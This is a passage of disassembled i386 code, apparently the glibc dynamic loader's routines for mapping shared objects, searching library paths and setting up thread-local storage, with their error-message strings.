mov dword [var_98h], edx
mov ecx, dword [var_80h_2]
mov edx, dword [ecx + 0x1cc]
mov eax, dword [ecx + 0x1c8]
mov ecx, edx
xor eax, ebx
xor ecx, esi
or ecx, eax
jne 0x807baa5
mov ecx, dword [var_80h_2]
mov eax, dword [ecx + 0x1c0]
mov edx, dword [ecx + 0x1c4]
xor eax, dword [var_9ch]
mov ecx, dword [var_98h]
xor ecx, edx
or ecx, eax
je 0x807c7d8
mov eax, dword [var_80h_2]
mov eax, dword [eax + 0xc]
test eax, eax
mov dword [var_80h_2], eax
jne 0x807ba67
xor eax, eax
test byte [var_4h], 4
jne 0x807c04a
test byte [0x80aac10], 0x40
jne 0x807c7c0
mov eax, dword [var_18h_2]
lea ecx, [edi + 4]
mov ebx, str.cannot_create_shared_object_descriptor
mov dword [var_84h], ecx
mov dword [esp], eax
mov eax, dword [var_bp_4h]
mov edx, dword [var_4h_2]
mov ecx, dword [var_1ch_2]
call fcn.0807ea00
sub esp, 4
mov dword [var_80h], eax
test eax, eax
je 0x807bdc3
mov ebx, dword [var_84h]
mov esi, dword [var_80h]
mov eax, dword [ebx + 0x18]
mov dword [esi + 0x148], eax
movzx eax, word [ebx + 0x10]
mov dword [var_90h], eax
movzx eax, word [ebx + 0x2c]
mov word [esi + 0x14c], ax
movzx edx, word [ebx + 0x2c]
shl edx, 5
mov dword [var_8ch], edx
mov ecx, dword [var_8ch]
mov edx, dword [ebx + 0x1c]
lea eax, [ecx + edx]
cmp eax, dword [edi]
ja 0x807c756
lea edi, [edx + edi + 4]
mov dword [var_88h_2], edi
mov ebx, dword [var_80h]
mov edi, dword [var_88h_2]
mov dword [var_a4h], esp
mov dword [var_a0h_2], 7
mov dword [var_ach], 0
mov byte [var_adh], 0
movzx esi, word [ebx + 0x14c]
movzx edx, si
lea eax, [edx + edx*2 - 3]
shl edx, 5
lea eax, [eax*8 + 0x28]
add edx, edi
sub esp, eax
lea eax, [var_43h]
and eax, 0xfffffff0
cmp edi, edx
mov dword [var_a8h], eax
jae 0x807c43b
mov dword [var_c0h], eax
mov esi, esi
mov eax, dword [edi]
cmp eax, 6
je 0x807c745
ja 0x807c540
cmp eax, 1
je 0x807c45d
cmp eax, 2
je 0x807c442
movzx eax, si
add edi, 0x20
shl eax, 5
add eax, dword [var_88h_2]
cmp edi, eax
jb 0x807bbb0
mov eax, dword [var_ach]
test eax, eax
je 0x807c43b
mov ecx, dword [var_ach]
mov ebx, dword [var_a8h]
lea eax, [ecx + ecx*2]
mov edx, dword [ebx]
lea esi, [ebx + eax*8]
mov eax, dword [esi - 0xc]
sub eax, edx
cmp dword [var_90h_2], 3
mov dword [var_8ch_2], eax
jne 0x807c402
mov eax, dword [ebx + 0x10]
and edx, dword [0x80a95ac]
mov dword [var_sp_10h], eax
mov ecx, dword [var_8h_3]
mov dword [var_8h_3], 0x802
mov dword [var_ch_3], ecx
mov eax, dword [ebx + 0x14]
mov dword [var_4h_3], eax
mov eax, dword [var_8ch_2]
mov dword [esp], edx
mov dword [var_4h_4], eax
call fcn.080546d0
mov ecx, dword [var_80h_2]
cmp eax, 0xffffffff
mov edx, eax
mov dword [ecx + 0x194], eax
je 0x807bdb8
mov ecx, dword [var_8ch_2]
lea eax, [ecx + eax]
mov ecx, dword [var_80h_2]
mov dword [ecx + 0x198], eax
sub edx, dword [ebx]
cmp byte [var_adh], 0
mov dword [ecx], edx
jne 0x807c3de
test byte [ebx + 0x14], 4
je 0x807bca0
mov ecx, dword [var_80h_2]
mov eax, dword [ebx + 4]
add eax, dword [ecx]
mov dword [ecx + 0x19c], eax
mov esi, dword [var_80h_2]
mov eax, dword [esi + 0x144]
test eax, eax
jne 0x807bce2
mov eax, dword [var_84h_2]
mov esi, dword [ebx + 0x10]
mov ecx, dword [eax + 0x1c]
cmp esi, ecx
ja 0x807bce2
movzx eax, word [eax + 0x2c]
mov edx, dword [ebx + 4]
mov edi, dword [ebx]
shl eax, 5
sub edx, edi
add edx, esi
lea eax, [eax + ecx]
cmp edx, eax
jb 0x807bce2
mov edx, dword [var_80h_2]
lea eax, [ecx + edi]
sub eax, esi
mov dword [edx + 0x144], eax
mov ecx, dword [ebx + 0xc]
mov edx, dword [ebx + 8]
cmp ecx, edx
jbe 0x807bd54
mov esi, dword [var_80h_2]
mov eax, dword [esi]
lea esi, [edx + eax]
add eax, ecx
mov dword [var_bch], eax
mov eax, dword [0x80aac74]
lea edi, [eax + esi - 1]
neg eax
and edi, eax
cmp dword [var_bch], edi
cmovb edi, dword [var_bch]
cmp edi, esi
jbe 0x807bd48
mov eax, dword [ebx + 0x14]
test al, 2
je 0x807c3aa
mov eax, edi
mov dword [var_4h_4], 0
mov dword [esp], esi
sub eax, esi
mov dword [var_4h_3], eax
call fcn.080536f0
mov eax, dword [ebx + 0x14]
test al, 2
je 0x807c386
cmp dword [var_bch], edi
ja 0x807c33e
mov edx, dword [var_ach]
mov ecx, dword [var_a8h]
add ebx, 0x18
lea eax, [edx + edx*2]
lea eax, [ecx + eax*8]
cmp ebx, eax
jae 0x807bdfe
mov eax, dword [ebx]
cmp dword [ebx + 4], eax
jbe 0x807bc8c
mov eax, dword [ebx + 0x10]
mov dword [var_sp_10h], eax
mov esi, dword [var_8h_3]
mov dword [var_8h_3], 0x812
mov dword [var_ch_3], esi
mov eax, dword [ebx + 0x14]
mov dword [var_4h_3], eax
mov eax, dword [ebx + 4]
sub eax, dword [ebx]
mov dword [var_4h_4], eax
mov edx, dword [var_80h_2]
mov eax, dword [ebx]
add eax, dword [edx]
mov dword [esp], eax
call fcn.080546d0
inc eax
jne 0x807bc8c
mov ebx, str.failed_to_map_segment_from_shared_object
mov esp, dword [var_a4h]
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_94h], eax
mov dword [var_sp_10h], ebx
mov edx, dword [var_80h]
mov dword [var_sp_10h], edx
mov ecx, dword [var_sp_10h]
mov dword [var_8h_3], ecx
mov ebx, dword [var_4h_3]
mov dword [var_8h_3], ebx
mov esi, dword [var_8h_3]
mov dword [var_4h_3], esi
mov eax, dword [var_94h]
mov dword [esp], eax
call fcn.0807b960
mov ebx, dword [var_80h]
mov eax, dword [ebx + 0x144]
test eax, eax
je 0x807c2eb
mov ebx, dword [var_80h]
add eax, dword [ebx]
mov dword [ebx + 0x144], eax
mov esi, dword [var_80h]
mov esp, dword [var_a4h]
mov eax, dword [esi + 0x210]
test eax, eax
je 0x807be35
add eax, dword [esi]
mov dword [esi + 0x210], eax
mov eax, dword [var_8h_2]
mov dword [esp], eax
call fcn.08053f20
mov ecx, dword [var_80h]
mov dword [var_8h_2], 0xffffffff
movzx edx, byte [ecx + 0x174]
mov eax, edx
and eax, 3
dec al
je 0x807c2d0
mov ebx, dword [var_80h]
mov eax, dword [ebx + 8]
test eax, eax
jne 0x807c2c1
cmp dword [var_90h], 3
mov ebx, str.object_file_has_no_dynamic_section
je 0x807bdd0
mov eax, dword [var_80h]
mov edx, dword [eax]
mov ecx, dword [var_80h]
add dword [ecx + 0x148], edx
test byte [0x80aac10], 0x40
jne 0x807c24a
mov esi, dword [var_80h]
mov ecx, dword [esi + 8]
test ecx, ecx
je 0x807bfbf
mov edx, dword [ecx]
add esi, 0x18
test edx, edx
je 0x807becc
mov edi, 0x6fffffff
cmp edx, 0x21
jg 0x807c1f1
mov dword [esi + edx*4], ecx
add ecx, 8
mov eax, dword [ecx]
test eax, eax
mov edx, eax
jne 0x807beb5
mov eax, dword [var_80h]
mov edx, dword [eax]
test edx, edx
je 0x807bf28
mov eax, dword [esi + 0x10]
test eax, eax
je 0x807bedf
add dword [eax + 4], edx
mov eax, dword [esi + 0xc]
test eax, eax
je 0x807bee9
add dword [eax + 4], edx
mov eax, dword [esi + 0x14]
test eax, eax
je 0x807bef3
add dword [eax + 4], edx
mov eax, dword [esi + 0x18]
test eax, eax
je 0x807befd
add dword [eax + 4], edx
mov eax, dword [esi + 0x1c]
test eax, eax
je 0x807bf07
add dword [eax + 4], edx
mov eax, dword [esi + 0x44]
test eax, eax
je 0x807bf11
add dword [eax + 4], edx
mov eax, dword [esi + 0x5c]
test eax, eax
je 0x807bf1b
add dword [eax + 4], edx
mov eax, dword [esi + 0xc4]
test eax, eax
je 0x807bf28
add dword [eax + 4], edx
mov eax, dword [esi + 0x50]
test eax, eax
je 0x807bf3b
mov eax, dword [eax + 4]
cmp eax, 0x11
jne 0x807c1c7
mov eax, dword [esi + 0x1c]
test eax, eax
je 0x807bf4f
mov eax, dword [esi + 0x24]
cmp dword [eax + 4], 0xc
jne 0x807c1a6
mov eax, dword [esi + 0x44]
test eax, eax
je 0x807bf63
mov eax, dword [esi + 0x4c]
cmp dword [eax + 4], 8
jne 0x807c182
mov edx, dword [esi + 0x78]
test edx, edx
je 0x807bf94
mov eax, dword [edx + 4]
mov ecx, dword [var_80h]
test al, 2
mov dword [ecx + 0x1f0], eax
je 0x807bf7d
mov dword [esi + 0x40], edx
mov ebx, dword [var_80h]
mov eax, dword [ebx + 0x1f0]
test al, 4
je 0x807bf8d
mov dword [esi + 0x58], edx
test al, 8
je 0x807bf94
mov dword [esi + 0x60], edx
mov edx, dword [esi + 0x98]
test edx, edx
je 0x807bfb1
mov eax, dword [edx + 4]
mov ecx, dword [var_80h]
test al, 1
mov dword [ecx + 0x1ec], eax
je 0x807bfb1
mov dword [esi + 0x60], edx
mov edi, dword [esi + 0x74]
test edi, edi
je 0x807bfbf
mov dword [esi + 0x3c], 0
mov ebx, dword [var_80h]
test byte [ebx + 0x1ec], 0x40
jne 0x807c11f
mov eax, dword [var_80h]
mov edx, dword [eax + 0x28]
test edx, edx
jne 0x807c115
mov edx, dword [var_80h]
mov eax, dword [edx + 0x58]
test eax, eax
jne 0x807c08d
mov eax, dword [var_80h]
mov edx, dword [var_68h]
mov ecx, dword [var_80h]
test byte [eax + 0x1ec], 0x20
cmove eax, dword [0x80aac64]
mov dword [0x80aac64], eax
mov eax, dword [var_6ch]
mov dword [ecx + 0x1c4], edx
mov dword [ecx + 0x1c0], eax
mov edx, dword [var_10h_2]
mov eax, dword [var_14h_2]
mov dword [ecx + 0x1c8], eax
mov dword [ecx + 0x1cc], edx
mov eax, dword [0x80a95c8]
not eax
and dword [var_a0h], eax
test byte [var_a0h], 1
jne 0x807c070
mov eax, dword [0x80aac20]
test eax, eax
jne 0x807c052
mov eax, dword [var_80h]
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_80h]
mov edx, dword [eax + 0x50]
test edx, edx
je 0x807c047
mov ecx, eax
mov edx, dword [edx + 4]
mov eax, dword [eax + 0x2c]
add edx, dword [eax + 4]
mov eax, ecx
call fcn.0807b200
jmp 0x807c047
mov eax, dword [var_8h]
mov ebx, str.cannot_enable_executable_stack_as_shared_object_requires
call dword [0x80a95cc]
test eax, eax
mov dword [var_94h], eax
je 0x807c03e
jmp 0x807bdd0
mov ecx, dword [var_80h]
add edx, 0x150
mov eax, dword [ecx + 0x1b4]
cmp edx, dword [eax]
je 0x807bfeb
mov dword [esp], 4
call fcn.08050fe0
mov ebx, dword [var_80h]
test eax, eax
mov dword [ebx + 0x158], eax
mov ebx, str.cannot_create_searchlist
je 0x807bdc3
mov esi, dword [var_80h]
mov dword [eax], esi
mov dword [esi + 0x15c], 1
mov eax, dword [esi + 0x1b0]
lea eax, [eax*4 - 4]
mov dword [var_8h_3], eax
mov eax, dword [esi + 0x1b4]
mov dword [var_4h_3], eax
mov eax, dword [esi + 0x1b4]
add eax, 4
mov dword [esp], eax
call fcn.08053690
mov eax, esi
mov edx, dword [esi + 0x1b4]
add eax, 0x158
mov dword [edx], eax
jmp 0x807bfeb
call fcn.0807e920
jmp 0x807bfdd
mov esi, dword [var_4h]
test esi, esi
jns 0x807bfcf
mov eax, dword [ebx + 0x198]
sub eax, dword [ebx + 0x194]
mov dword [var_4h_3], eax
mov eax, dword [ebx + 0x194]
mov dword [esp], eax
call fcn.08054780
mov eax, dword [ebx + 0x14]
mov ecx, dword [eax + 8]
test ecx, ecx
je 0x807c178
mov esi, dword [var_80h]
test byte [esi + 0x174], 0x80
jne 0x807c168
mov ebx, str.shared_object_cannot_be_dlopen__ed
jmp 0x807bdd0
mov eax, dword [esi + 0x144]
mov dword [esp], eax
call fcn.08051180
jmp 0x807c15e
mov dword [esp], eax
call fcn.08051180
jmp 0x807c152
mov dword [var_ch_3], str.elf_get_dynamic_info
mov dword [var_8h_3], 0x9f
mov dword [var_4h_3], str.dynamic_link.h
mov dword [esp], str.info_19___d_un.d_val__sizeof__Elf32_Rel_
call fcn.0805efc0
mov dword [var_ch_3], str.elf_get_dynamic_info
mov dword [var_8h_3], 0x9b
mov dword [var_4h_3], str.dynamic_link.h
mov dword [esp], str.info_9___d_un.d_val__sizeof__Elf32_Rela_
jmp 0x807c1a1
cmp eax, 7
je 0x807bf3b
mov dword [var_ch_3], str.elf_get_dynamic_info
mov dword [var_8h_3], 0x96
mov dword [var_4h_3], str.dynamic_link.h
mov dword [esp], str.info_20___d_un.d_val__17__info_20___d_un.d_val__7
jmp 0x807c1a1
mov eax, edi
sub eax, edx
cmp eax, 0xf
ja 0x807c209
mov eax, 0x70000021
sub eax, edx
mov dword [esi + eax*4], ecx
jmp 0x807bec1
lea ebx, [edx + edx]
sar ebx, 1
mov eax, ebx
not eax
cmp eax, 2
ja 0x807c220
mov eax, 0x31
sub eax, ebx
jmp 0x807c201
mov eax, 0x6ffffdff
sub eax, edx
cmp eax, 0xb
ja 0x807c233
mov eax, 0x6ffffe34
jmp 0x807c1ff
mov eax, 0x6ffffeff
sub eax, edx
cmp eax, 9
ja 0x807bec1
mov eax, 0x6fffff40
jmp 0x807c1ff
movzx eax, word [ecx + 0x14c]
mov dword [var_2ch], 8
mov dword [var_30h], eax
mov eax, dword [ecx + 0x144]
mov dword [var_24h], 8
mov dword [var_28h], eax
mov eax, dword [ecx + 0x148]
mov dword [var_sp_1ch], 8
mov dword [var_20h], eax
mov ebx, dword [var_8ch]
mov dword [var_sp_14h], 8
mov dword [var_sp_18h], ebx
mov eax, dword [ecx]
mov dword [var_ch_3], 8
mov dword [var_sp_10h], eax
mov eax, dword [ecx + 8]
mov dword [esp], str.__dynamic:_0x_0lx__base:_0x_0lx___size:_0x_0Zx_n____entry:_0x_0lx__phdr:_0x_0lx__phnum:____u_n_n
mov dword [var_4h_3], 8
mov dword [var_8h_3], eax
call fcn.08081c40
jmp 0x807be99
mov esi, dword [var_80h]
mov edx, dword [esi]
add eax, edx
mov dword [esi + 8], eax
jmp 0x807be83
cmp dword [var_90h], 2
jne 0x807be5e
and edx, 0xfffffffc
mov byte [ecx + 0x174], dl
jmp 0x807be5e
mov esi, dword [var_84h]
movzx eax, word [esi + 0x2c]
shl eax, 5
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
je 0x807c334
mov edx, dword [var_84h]
mov esi, dword [var_88h]
mov edi, eax
cld
movzx ecx, word [edx + 0x2c]
shl ecx, 5
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov ecx, dword [var_80h]
or byte [ecx + 0x174], 0x80
mov dword [ecx + 0x144], eax
jmp 0x807be1a
mov ebx, str.cannot_allocate_memory_for_program_header
jmp 0x807bdbd
mov dword [var_sp_10h], 0
mov dword [var_ch_3], 0xffffffff
mov dword [var_8h_3], 0x32
mov eax, dword [ebx + 0x14]
mov dword [var_4h_3], eax
sub dword [var_bch], edi
mov eax, dword [var_bch]
mov dword [esp], edi
mov dword [var_4h_4], eax
call fcn.080546d0
inc eax
jne 0x807bd54
mov ebx, str.cannot_map_zero_fill_pages
jmp 0x807bdbd
mov dword [var_4h_3], eax
mov eax, dword [0x80aac74]
mov dword [var_4h_4], eax
mov eax, dword [0x80aac74]
dec eax
not eax
and esi, eax
mov dword [esp], esi
call fcn.080547a0
jmp 0x807bd48
or eax, 2
mov dword [var_4h_3], eax
mov eax, dword [0x80aac74]
mov dword [var_4h_4], eax
mov eax, dword [0x80aac74]
dec eax
not eax
and eax, esi
mov dword [esp], eax
call fcn.080547a0
test eax, eax
jns 0x807bd25
mov ebx, str.cannot_change_memory_protections
jmp 0x807bdbd
mov dword [var_4h_3], 0
mov eax, dword [esi - 0xc]
sub eax, dword [ebx + 4]
mov dword [var_4h_4], eax
mov eax, dword [ebx + 4]
add eax, dword [ecx]
mov dword [esp], eax
call fcn.080547a0
jmp 0x807bc8c
test dword [var_sp_1ch], 0x20000000
je 0x807c42b
mov ecx, dword [var_80h_2]
mov eax, edx
add eax, dword [ecx]
mov dword [ecx + 0x194], eax
add eax, dword [var_8ch_2]
cmp ebx, esi
mov dword [ecx + 0x198], eax
jmp 0x807bd6b
mov ebx, str.cannot_dynamically_load_executable
mov esp, dword [var_a4h_2]
jmp 0x807bdd0
mov ebx, str.object_file_has_no_loadable_segments
jmp 0x807c430
mov eax, dword [edi + 8]
mov edx, dword [var_80h_2]
mov dword [edx + 8], eax
mov eax, dword [edi + 0x14]
shr eax, 3
mov word [edx + 0x14e], ax
jmp 0x807bbd3
mov ebx, dword [0x80aac74]
mov edx, dword [edi + 0x1c]
mov ecx, ebx
mov dword [var_b4h], ebx
dec ecx
test ecx, edx
jne 0x807c535
mov eax, dword [edi + 8]
dec edx
mov dword [var_b8h], eax
sub eax, dword [edi + 4]
test edx, eax
jne 0x807c52b
mov ebx, dword [var_c0h]
not edx
not ecx
inc dword [var_ach]
lea eax, [ebx + 0x18]
mov dword [var_c0h], eax
mov eax, dword [var_b8h]
and edx, eax
mov eax, dword [var_c0h]
mov dword [var_c4h], edx
mov dword [eax - 0x18], edx
mov edx, dword [var_b4h]
mov eax, dword [edi + 0x10]
add eax, dword [edi + 8]
lea eax, [edx + eax - 1]
and eax, ecx
mov ecx, dword [var_c0h]
mov dword [ecx - 0x14], eax
mov eax, dword [edi + 0x10]
add eax, dword [edi + 8]
mov dword [ecx - 0x10], eax
mov eax, dword [edi + 0x14]
add eax, dword [edi + 8]
mov dword [ecx - 0xc], eax
mov eax, dword [edi + 0x1c]
dec eax
not eax
and eax, dword [edi + 4]
cmp dword [var_ach], 1
mov dword [ecx - 8], eax
jbe 0x807c510
mov eax, dword [var_c4h]
cmp dword [ebx - 0x14], eax
je 0x807c510
mov byte [var_adh], 1
mov ecx, dword [edi + 0x18]
mov eax, 0x73516240
and ecx, 7
shl ecx, 2
sar eax, cl
and eax, 0xf
mov dword [ebx + 0x14], eax
jmp 0x807bbd3
mov ebx, str.ELF_load_command_address_offset_not_properly_aligned
jmp 0x807c430
mov ebx, str.ELF_load_command_alignment_not_page_aligned
jmp 0x807c430
nop
cmp eax, 0x6474e551
je 0x807c737
ja 0x807c712
cmp eax, 7
jne 0x807bbd3
mov eax, dword [edi + 0x14]
test eax, eax
je 0x807bbd3
mov edx, dword [var_80h_2]
mov dword [edx + 0x218], eax
mov eax, dword [edi + 0x1c]
mov dword [edx + 0x21c], eax
mov eax, dword [edi + 0x1c]
test eax, eax
jne 0x807c700
mov dword [edx + 0x220], 0
mov ebx, dword [var_80h_2]
mov eax, dword [edi + 0x10]
mov dword [ebx + 0x214], eax
mov eax, dword [edi + 8]
mov dword [ebx + 0x210], eax
movzx eax, byte [ebx + 0x174]
and eax, 3
dec al
jne 0x807c5c9
call fcn.08082e40
mov esi, dword [var_80h_2]
mov dword [esi + 0x228], eax
movzx esi, word [esi + 0x14c]
jmp 0x807bbd3
mov eax, dword [0x80aabdc]
test eax, eax
jne 0x807c5af
call fcn.080489d0
test eax, eax
jne 0x807c6e6
xor eax, eax
call fcn.080831f0
test eax, eax
mov dword [var_c8h], eax
je 0x807c6e6
mov edx, dword [var_c8h]
mov eax, dword [0x80a95d0]
lea esi, [var_7ch]
mov ebx, esi
mov dword [edx + 0x10], eax
mov dword [edx], edx
mov dword [edx + 8], edx
movzx eax, byte [var_70h]
mov dword [var_7ch], 0xffffffff
mov dword [var_78h], edx
mov dword [var_74h], 0xfffff
and eax, 0xffffffd1
or eax, 0x51
mov byte [var_70h], al
mov eax, 0xf3
and dword [var_70h], 0x7f
int 0x80
test eax, eax
jne 0x807c68c
mov eax, dword [var_7ch]
lea eax, [eax*8 + 3]
mov gs, eax
xor eax, eax
test eax, eax
mov ebx, eax
jne 0x807c66d
mov ebx, dword [var_80h_2]
mov eax, dword [0x80aabd8]
movzx esi, word [ebx + 0x14c]
inc eax
mov dword [0x80aabd8], eax
mov dword [ebx + 0x228], eax
jmp 0x807bbd3
mov eax, dword [var_c8h]
mov edx, 1
mov dword [var_94h_2], 0
call fcn.08083210
jmp 0x807c430
cmp dword [0x80aac6c], 0x20362
jbe 0x807c6dc
movzx eax, byte [var_70h]
mov dword [var_7ch], 0
mov ebx, 1
mov edx, 0x10
mov ecx, esi
and eax, 0xffffffd1
or eax, 0x51
mov byte [var_70h], al
mov eax, 0x7b
and dword [var_70h], 0x7f
int 0x80
test eax, eax
mov edx, str.cannot_set_up_LDT_for_thread_local_storage_n
jne 0x807c6d5
mov eax, 7
mov gs, eax
xor edx, edx
mov eax, edx
jmp 0x807c647
mov eax, str.kernel_too_old_for_thread_local_storage_support_n
jmp 0x807c647
mov ebx, str.cannot_allocate_TLS_data_structures_for_initial_thread
mov dword [var_94h_2], 0xc
jmp 0x807c430
lea esi, [esi]
dec eax
mov ecx, dword [var_80h_2]
and eax, dword [edi + 8]
mov dword [ecx + 0x220], eax
jmp 0x807c58c
cmp eax, 0x6474e552
jne 0x807bbd3
mov eax, dword [edi + 8]
mov edx, dword [var_80h_2]
mov dword [edx + 0x22c], eax
mov eax, dword [edi + 0x14]
mov dword [edx + 0x230], eax
jmp 0x807bbd3
mov eax, dword [edi + 0x18]
mov dword [var_a0h_2], eax
jmp 0x807bbd3
mov eax, dword [edi + 8]
mov ecx, dword [var_80h_2]
mov dword [ecx + 0x144], eax
jmp 0x807bbd3
mov eax, dword [var_8ch]
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea ebx, [var_43h]
and ebx, 0xfffffff0
mov dword [var_88h], ebx
mov dword [var_4h_3], 0
mov esi, dword [var_84h]
mov eax, dword [esi + 0x1c]
mov dword [var_4h_4], eax
mov eax, dword [var_8h_2]
mov dword [esp], eax
call fcn.08090150
mov edx, dword [var_8ch]
mov dword [var_4h_4], ebx
mov ebx, str.cannot_read_file_data
mov dword [var_4h_3], edx
mov ecx, dword [var_8h_2]
mov dword [esp], ecx
call fcn.08053f70
cmp eax, dword [var_8ch]
jne 0x807bdc3
jmp 0x807bb4d
mov edx, dword [var_4h_2]
mov dword [esp], str.file_s___generating_link_map_n
mov dword [var_4h_3], edx
call fcn.08081c40
jmp 0x807bacb
mov ebx, dword [var_8h_3]
mov dword [esp], ebx
call fcn.08053f20
mov esi, dword [var_sp_10h]
mov dword [esp], esi
call fcn.08051180
mov edx, dword [var_4h_3]
mov eax, dword [var_80h_2]
jmp 0x807c069
mov ebx, str.cannot_stat_shared_object
jmp 0x807bdc3
push ebp
xor eax, eax
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_ch]
mov edx, dword [ebx]
cmp edx, 0xffffffff
je 0x807b6d4
test edx, edx
mov eax, 1
jne 0x807b6d4
mov eax, dword [arg_10h]
mov edx, dword [ecx + eax*4 + 0x18]
test edx, edx
jne 0x807b6d9
xor eax, eax
mov dword [ebx], 0xffffffff
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [ecx + 0x2c]
mov edx, dword [edx + 4]
add edx, dword [eax + 4]
mov eax, dword [arg_14h]
mov dword [esp], eax
mov eax, ebx
call fcn.0807b540
sub esp, 4
mov eax, 1
jmp 0x807b6d4
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x88
mov edx, dword [arg_ch]
mov dword [var_7ch], 0
mov eax, dword [arg_14h]
mov dword [var_74h], 0xffffffff
mov dword [var_78h], 0
mov eax, dword [eax]
mov dword [var_70h], eax
mov eax, dword [0x80aa9f0]
add eax, dword [0x80aa9fc]
lea eax, [edx + eax + 0x12]
and eax, 0xfffffffc
sub esp, eax
mov eax, dword [var_70h]
lea edi, [var_1bh]
and edi, 0xfffffff0
mov esi, dword [eax]
lea esi, [esi]
test byte [0x80aac10], 1
mov dword [var_80h], 0
mov dword [var_88h], 0
jne 0x807cf71
mov eax, dword [esi + 0x10]
xor ebx, ebx
mov dword [var_8h], eax
mov eax, dword [esi + 0xc]
mov dword [esp], edi
mov dword [var_4h], eax
call fcn.08053740
cmp dword [var_74h], 0xffffffff
mov dword [var_84h], eax
jne 0x807cdd7
cmp ebx, dword [0x80aa9ec]
jae 0x807cd5e
mov esi, esi
cmp dword [esi + ebx*4 + 0x14], 1
jne 0x807ce12
inc ebx
cmp dword [var_74h], 0xffffffff
jne 0x807cdd7
cmp ebx, dword [0x80aa9ec]
jb 0x807cd40
cmp dword [var_74h], 0xffffffff
jne 0x807cdd7
mov eax, dword [var_88h]
test eax, eax
je 0x807cd84
call fcn.08048b20
mov eax, dword [eax]
cmp eax, 2
je 0x807cd84
cmp eax, 0xd
mov edx, 0xffffffff
jne 0x807cdac
add dword [var_70h], 4
mov eax, dword [var_88h]
mov edx, dword [var_70h]
or dword [var_7ch], eax
mov eax, dword [edx]
test eax, eax
mov esi, eax
jne 0x807ccf0
mov edi, dword [var_7ch]
test edi, edi
je 0x807cdb6
mov edx, 0xffffffff
lea esp, [var_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov esi, dword [eax + 4]
test esi, esi
jne 0x807cdcb
mov eax, dword [arg_14h]
mov dword [eax], 0xffffffff
jmp 0x807cda7
mov eax, dword [eax]
mov dword [esp], eax
call fcn.08051180
jmp 0x807cdc0
mov edx, dword [var_80h]
mov dword [esp], edx
call fcn.08050fe0
mov edx, eax
mov eax, dword [arg_18h]
test edx, edx
mov dword [eax], edx
je 0x807ce05
mov eax, dword [var_80h]
mov dword [esp], edx
mov dword [var_4h], edi
mov dword [var_8h], eax
call fcn.08053770
mov edx, dword [var_74h]
jmp 0x807cdac
mov edx, dword [var_74h]
mov dword [esp], edx
call fcn.08053f20
jmp 0x807cda7
mov edx, dword [0x80aa9e8]
mov eax, dword [edx + ebx*8 + 4]
mov dword [var_8h], eax
mov eax, dword [edx + ebx*8]
mov edx, dword [var_84h]
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.08053740
mov edx, dword [arg_ch]
mov dword [esp], eax
mov dword [var_8h], edx
mov edx, dword [arg_8h]
mov dword [var_4h], edx
call fcn.08053740
mov dword [var_80h], eax
sub dword [var_80h], edi
test byte [0x80aac10], 1
jne 0x807cf5c
mov eax, dword [arg_1ch]
mov dword [esp], edi
mov dword [var_4h], eax
call fcn.0807c970
mov edx, dword [esi + ebx*4 + 0x14]
mov dword [var_74h], eax
test edx, edx
jne 0x807ce8c
inc eax
je 0x807cf11
mov dword [esi + ebx*4 + 0x14], 2
mov edx, 2
mov eax, dword [var_88h]
or eax, 1
cmp edx, 2
cmovne eax, dword [var_88h]
cmp dword [var_74h], 0xffffffff
mov dword [var_88h], eax
je 0x807cd4b
mov eax, dword [arg_10h]
test eax, eax
je 0x807cd4b
mov eax, dword [0x80a95f4]
test eax, eax
je 0x807cd4b
mov edx, dword [var_74h]
lea eax, [var_6ch]
mov dword [esp], 3
mov dword [var_8h], eax
mov dword [var_4h], edx
call fcn.08053dc0
test eax, eax
jne 0x807ceef
test byte [var_5bh], 8
jne 0x807cd4b
mov eax, dword [var_74h]
mov dword [esp], eax
call fcn.08053f20
mov dword [var_74h], 0xffffffff
call fcn.08048b20
mov dword [eax], 2
jmp 0x807cd4b
mov eax, dword [var_80h]
lea edx, [var_6ch]
sub eax, dword [arg_ch]
mov byte [eax + edi - 1], 0
mov dword [esp], 3
mov dword [var_4h], edi
mov dword [var_8h], edx
call fcn.08079600
test eax, eax
jne 0x807cf4a
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x4000
je 0x807ce7f
mov edx, 1
mov dword [esi + ebx*4 + 0x14], 1
jmp 0x807ce8c
mov dword [var_4h], edi
mov dword [esp], str.__trying_file_s_n
call fcn.08081c40
jmp 0x807ce5e
mov eax, dword [esi + 4]
cmp dword [var_78h], eax
je 0x807cd0e
mov dword [var_78h], eax
mov edx, dword [var_78h]
mov eax, dword [esi + 8]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov eax, dword [var_70h]
mov dword [esp], eax
call fcn.0807c810
jmp 0x807cd0e
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x4c
test byte [0x80aac10], 1
mov dword [var_10h], eax
jne 0x807de2a
mov ecx, dword [0x80aaa00]
test ecx, ecx
je 0x807dd4d
xor eax, eax
cmp ecx, 0xffffffff
je 0x807dab6
mov edx, dword [0x80aaa04]
mov dword [var_24h], 0
cmp edx, 0xffffffff
mov dword [var_28h], edx
mov ebx, edx
je 0x807dc1a
add ecx, dword [0x80aaa08]
sub ecx, edx
mov dword [var_20h], ecx
mov ecx, dword [0x80aac34]
test ecx, ecx
mov dword [var_34h], ecx
je 0x807da10
xor edi, edi
mov esi, str.i386
lea esi, [esi]
mov eax, dword [var_34h]
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x807dc12
inc edi
add esi, 5
cmp edi, 3
jle 0x807d9f0
mov eax, 0xffffffff
cdq
mov dword [var_30h], eax
mov eax, dword [var_30h]
mov dword [var_2ch], edx
and eax, dword [var_2ch]
inc eax
je 0x807da46
movzx ecx, byte [var_30h]
mov esi, 1
xor edi, edi
xor eax, eax
shld edi, esi, cl
shl esi, cl
and ecx, 0x20
cmovne edi, esi
cmovne esi, eax
mov dword [var_30h], esi
mov dword [var_2ch], edi
mov edx, dword [var_28h]
